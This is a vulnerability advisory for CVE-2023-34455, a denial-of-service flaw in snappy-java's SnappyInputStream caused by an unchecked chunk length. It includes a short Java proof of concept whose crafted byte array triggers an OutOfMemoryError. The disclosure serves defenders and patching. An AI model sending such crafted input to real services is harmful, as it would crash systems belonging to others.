---
description: CVE-2023-34455, HIGH, snappy-java unchecked chunk length DoS
title: snappy-java unchecked chunk length DoS
date_published: "2023-06-19"
last_updated: "2023-06-19"
xray_id: XRAY-522074
vul_id: CVE-2023-34455
cvss: 7.5
severity: high
discovered_by: Ori Hollander
type: vulnerability

---

## Summary

snappy-java unchecked chunk length DoS

## Component

org.xerial.snappy:snappy-java

## Affected versions

(,1.1.10.1)

## Description

snappy-java is a fast compressor/decompressor for Java. Due to use of an unchecked chunk length, an unrecoverable fatal error can occur in versions prior to 1.1.10.1.

The code in the function hasNextChunk in the fileSnappyInputStream.java checks if a given stream has more chunks to read. It does that by attempting to read 4 bytes. If it wasn?t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.

In the case that the `compressed` variable is null, a byte array is allocated with the size given by the input data. Since the code doesn?t test the legality of the `chunkSize` variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a `java.lang.NegativeArraySizeException` exception. A worse case would happen when passing a huge positive value (such as 0x7FFFFFFF), which would raise the fatal `java.lang.OutOfMemoryError` error.

Version 1.1.10.1 contains a patch for this issue.

## PoC

```java
package org.example;
import org.xerial.snappy.SnappyInputStream;

import java.io.*;

public class Main {

    public static void main(String[] args) throws IOException {
        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};
        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));
        byte[] out = new byte[50];
        try {
            in.read(out);
        }
        catch (Exception ignored) {

        }
    }
}
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388](https://github.com/xerial/snappy-java/blob/05c39b2ca9b5b7b39611529cc302d3d796329611/src/main/java/org/xerial/snappy/SnappyInputStream.java#L388)

[https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java](https://github.com/xerial/snappy-java/blob/master/src/main/java/org/xerial/snappy/SnappyInputStream.java)

[https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea)

[https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh](https://github.com/xerial/snappy-java/security/advisories/GHSA-qcwq-55hx-v3vh)

